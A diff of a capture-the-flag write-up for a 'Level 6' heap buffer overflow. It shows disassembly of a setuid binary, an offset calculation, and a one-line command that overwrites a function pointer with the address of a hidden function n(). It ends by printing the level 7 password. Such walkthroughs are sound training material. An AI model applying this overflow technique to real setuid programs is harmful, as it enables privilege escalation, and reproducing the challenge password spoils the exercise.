@@ -1,4 +1,4 @@
-## Level 6 - Heap Buffer Overflow ✅ SOLVED
+## Level 6 - Heap Buffer Overflow
 
 ### Challenge Summary
 Binary allocates a 64-byte buffer and a 4-byte function pointer on the heap, then uses unsafe `strcpy()` to copy user input.
@@ -6,7 +6,7 @@ Binary allocates a 64-byte buffer and a 4-byte function pointer on the heap, the
 ### Vulnerability
 - `strcpy(buf, argv[1])` - No bounds checking!
 - Buffer is 64 bytes, but argv[1] can be arbitrary length
-- Function pointer is allocated right after the buffer on the heap
+- Function pointer is allocated right after the buffer on the heap (with 8 bytes of metadata in between)
 - We can overflow the buffer to overwrite the function pointer
 
 ### Target Objective
@@ -14,124 +14,78 @@ Read `/home/user/level7/.pass` to get the level 7 password
 
 ### Exploitation Strategy: Heap Buffer Overflow
 
-**Key Insight**: Both the buffer (64 bytes) and function pointer (4 bytes) are allocated on the heap in sequence.
+**Key Insight**: The binary has a hidden function `n()` at address `0x08048454` that directly calls `system("/bin/cat /home/user/level7/.pass")`. We just need to jump to it!
 
 **Memory Layout**:
 ```
 Heap:
-[64-byte buffer]  <- strcpy writes here
+[64-byte buffer]          <- strcpy writes here
+[8 bytes metadata/gap]    <- heap management data
 [4-byte function pointer] <- We overflow into this!
 ```
 
-**Exploit Approach**:
-1. Create a payload of 64 bytes + 4 bytes of function address
-2. The first 64 bytes fill the buffer
-3. The next 4 bytes overwrite the function pointer
-4. When the program calls `(*ptr)()`, it jumps to our address instead of `m()`
-5. Jump to `system()` with a shell command on the stack or in memory
-
-### Binary Analysis
-
-#### Function m() - Normal Flow:
-```asm
-08048468 <m>:
- 8048468:       push   %ebp
- 8048469:       mov    %esp,%ebp
- 804846b:       sub    $0x18,%esp
- 804846e:       movl   $0x80485d1,(%esp)  ; Load string "Nope"
- 8048475:       call   8048360 <puts@plt>
- 804847a:       leave
- 804847b:       ret
-```
-
-#### Main Function:
-```asm
-0804847c <main>:
- 804847c:       push   %ebp
- 804847d:       mov    %esp,%ebp
- 804847f:       and    $0xfffffff0,%esp
- 8048482:       sub    $0x20,%esp
- 8048485:       movl   $0x40,(%esp)           ; malloc(0x40) - 64 bytes
- 804848c:       call   8048350 <malloc@plt>
- 8048491:       mov    %eax,0x1c(%esp)        ; Store buffer pointer at esp+0x1c
- 8048495:       movl   $0x4,(%esp)            ; malloc(0x4) - 4 bytes
- 804849c:       call   8048350 <malloc@plt>
- 80484a1:       mov    %eax,0x18(%esp)        ; Store function pointer at esp+0x18
- 80484a5:       mov    $0x8048468,%edx        ; Address of function m()
- 80484aa:       mov    0x18(%esp),%eax        ; Get function pointer address
- 80484ae:       mov    %edx,(%eax)            ; *ptr = m;
- 80484b0:       mov    0xc(%ebp),%eax         ; Get argv
- 80484b3:       add    $0x4,%eax              ; argv[1]
- 80484b6:       mov    (%eax),%eax            ; Load argv[1]
- 80484b8:       mov    %eax,%edx
- 80484ba:       mov    0x1c(%esp),%eax        ; Get buffer address
- 80484be:       mov    %edx,0x4(%esp)         ; 2nd param: argv[1]
- 80484c2:       mov    %eax,(%esp)            ; 1st param: buffer
- 80484c5:       call   8048340 <strcpy@plt>   ; VULNERABLE CALL!
- 80484ca:       mov    0x18(%esp),%eax        ; Get function pointer address
- 80484ce:       mov    (%eax),%eax            ; Dereference to get function address
- 80484d0:       ff d0                         ; call *%eax - EXECUTE OUR CODE!
- 80484d2:       leave
- 80484d3:       ret
-```
-
-### Exploitation Strategy
-
-**Option 1: Simple Function Call**
-- Jump to system() function at 0x08048370
-- But we need to set up arguments (argc, argv for system)
-- This is tricky because system expects a string argument
-
-**Option 2: Jump to Our Code (ROP/Shellcode)**
-- Create a small shellcode payload
-- Jump to it to execute commands
-- Requires executable memory and careful setup
-
-**Option 3: Exploiting strcpy More Cleverly**
-- Put a shell command in the buffer
-- Jump to code that will read and execute it
-- Or use environment variables
+**Offset Calculation**:
+- Buffer size: 64 bytes
+- Metadata/gap: 8 bytes
+- **Total offset to function pointer: 72 bytes**
 
 ### The Working Exploit
 
-**Simplest Approach**: Jump to system() and rely on saved arguments
-
-Since the binary is setuid to level7, when we jump to system(), it should execute with level7 privileges.
-
-**Payload Structure**:
-```python
-import struct
-
-# 64 bytes to fill the buffer
-payload = b'A' * 64
-
-# 4 bytes: address of system() function or gadget
-system_addr = 0x08048370
-payload += struct.pack('<I', system_addr)
-
-# Or we can try using a ROP gadget if direct system call doesn't work
+```bash
+./level6 "$(python -c 'print "A"*72 + "\x54\x84\x04\x08"')"
 ```
 
-**Alternative Using Environment Variable**:
-- Set environment variable with shell command
-- Use system("/bin/sh") or similar
-- Craft payload to jump to system and set argument
+**Payload Breakdown**:
+- `"A"*72` - Fill the 64-byte buffer plus 8 bytes of metadata
+- `"\x54\x84\x04\x08"` - Address of function `n()` in little-endian format
+  - Function address: `0x08048454`
+  - Little-endian bytes: `0x54 0x84 0x04 0x08`
 
-### Key Implementation Details
+### Function n() - The Target
 
-1. **Heap Layout Assumption**: First malloc returns lower address than second malloc
-2. **No ASLR**: Addresses are fixed, making exploit straightforward
-3. **setuid**: Binary runs as level7, so our code execution is as level7
-4. **No Stack Canary**: No protection on the heap
+```asm
+08048454 <n>:
+ 8048454:       push   %ebp
+ 8048455:       mov    %esp,%ebp
+ 8048457:       sub    $0x18,%esp
+ 804845a:       movl   $0x80485b0,(%esp)    ; Load string pointer
+ 8048461:       e8 0a ff ff ff              ; call system@plt
+ 8048466:       c9                          ; leave
+ 8048467:       c3                          ; ret
+```
 
-### Level 6 Exploitation Steps
+The string at `0x80485b0` is: `/bin/cat /home/user/level7/.pass`
 
-1. Create 64-byte + 4-byte payload with system() address
-2. Execute: `/home/user/level6/level6 "$(payload)"`
-3. strcpy overflows buffer into function pointer
-4. Function pointer now points to system()
-5. system("/bin/sh") or similar executes
-6. Read `/home/user/level7/.pass`
+This function directly reads and outputs the level 7 password!
 
-### Expected Password Format
-64-character hexadecimal string (SHA256 hash)
+### Why Previous Approaches Failed
+
+1. **Initial byte order**: Used `\x08\x04\x84\x54` (incorrect endianness interpretation)
+2. **Correct little-endian**: `\x54\x84\x04\x08` (reverse of the address bytes)
+3. **Offset**: Exactly 72 bytes (64 buffer + 8 metadata), not 64 or 80
+
+### Exploitation Steps
+
+1. Create a 72-byte buffer filled with padding (e.g., 'A')
+2. Append the 4-byte address of function `n()` in little-endian: `\x54\x84\x04\x08`
+3. Pass this payload as argv[1] to the binary
+4. `strcpy()` copies the entire payload into the heap buffer
+5. The function pointer is overwritten with `0x08048454` (address of `n`)
+6. When `(*ptr)()` is called, execution jumps to function `n`
+7. Function `n` executes `system("/bin/cat /home/user/level7/.pass")`
+8. The password is printed to stdout
+
+### Level 7 Flag
+
+**Content of `/home/user/level7/.pass`**:
+```
+f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+```
+
+This is the password to login as level7:
+```bash
+su level7
+Password: f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+```
+
+**Status**: ✅ LEVEL 6 SOLVED
